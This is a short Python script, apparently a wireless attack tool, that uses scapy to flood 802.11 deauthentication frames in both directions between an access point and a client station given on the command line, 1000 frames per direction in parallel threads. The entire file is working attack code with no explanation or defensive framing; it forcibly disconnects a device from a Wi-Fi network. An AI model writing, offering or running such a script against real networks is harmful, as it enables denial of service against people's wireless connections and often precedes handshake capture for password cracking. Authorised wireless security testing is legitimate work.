#!/usr/bin/python3
from scapy.all import *
from threading import Thread
from sys import argv

iface = argv[1]
ap = argv[2]
sta = argv[3]
conf.verb = 0
COUNT = 1000

def deauth(src, dst, count):
	deauth = RadioTap() / Dot11(addr1=dst, addr2=src, addr3=ap) / Dot11Deauth()
	sendp(deauth, iface=iface, count=count, inter=0.1, verbose=False)

threads = []
threads.append( Thread(target=deauth, args=(ap, sta, COUNT)) )
threads.append( Thread(target=deauth, args=(sta, ap, COUNT)) )
print(f"[*] deauth {ap} <--> {sta}")
[t.start() for t in threads]
[t.join() for t in threads]
